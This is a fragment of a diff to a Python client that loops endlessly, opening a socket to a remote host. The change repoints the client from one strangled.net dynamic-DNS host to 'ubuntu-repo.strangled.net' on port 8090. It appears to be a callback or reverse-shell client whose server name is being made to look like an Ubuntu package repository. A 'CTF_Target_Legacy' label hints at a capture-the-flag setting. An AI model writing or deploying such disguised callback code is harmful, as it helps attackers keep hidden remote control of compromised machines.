@@ -5,7 +5,7 @@ while 1:
         # TIER 1: Isolated Try block purely for handling connection errors
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("cheeva.strangled.net", 80))
+            s.connect(("ubuntu-repo.strangled.net", 8090))
 
             try: local_ip = s.getsockname()
             except: local_ip = "CTF_Target_Legacy"
